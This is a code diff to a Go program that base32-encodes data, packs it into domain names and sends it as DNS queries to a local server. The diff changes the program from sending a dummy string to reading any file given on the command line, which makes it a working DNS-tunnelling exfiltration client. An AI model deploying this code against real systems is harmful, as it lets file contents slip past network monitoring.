@@ -4,6 +4,7 @@ import (
 	"encoding/base32"
 	"fmt"
 	"log"
+	"os"
 
 	"github.com/miekg/dns"
 )
@@ -50,8 +51,8 @@ func queryDNS(domain, server string, qtype uint16) ([]string, error) {
 	return results, nil
 }
 
-func encodeBase32(data string) string {
-	encodedString := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString([]byte(data))
+func encodeBase32(data []byte) string {
+	encodedString := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(data)
 
 	return encodedString
 }
@@ -92,8 +93,12 @@ func chunkToDomain(chunk Chunk) string {
 	return domain
 }
 func main() {
-	dummyText := "hello world"
-	chunks := createChunks(encodeBase32(dummyText), 1, 8)
+	filePath := os.Args[1]
+	data, err := os.ReadFile(filePath)
+	if err != nil {
+		log.Fatal(err)
+	}
+	chunks := createChunks(encodeBase32(data), 1, 32)
 	for _, v := range chunks {
 		domain := chunkToDomain(v)
 		queryDNS(domain, "127.0.0.1:8053", dns.TypeA)
